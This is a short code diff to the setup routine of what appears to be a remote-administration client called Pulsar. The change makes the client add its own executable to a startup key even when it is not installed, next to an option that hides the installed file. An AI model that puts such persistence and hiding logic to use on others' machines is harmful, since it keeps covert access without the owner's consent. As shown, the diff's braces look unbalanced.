@@ -16,8 +16,14 @@ namespace Pulsar.Client.Setup
             if (Settings.STARTUP)
             {
                 var clientStartup = new ClientStartup();
-                clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
-            }
+                if (Settings.INSTALL)
+                {
+                    clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
+                }
+                else
+                {
+                    clientStartup.AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
+                }
 
             if (Settings.INSTALL && Settings.HIDEFILE)
             {
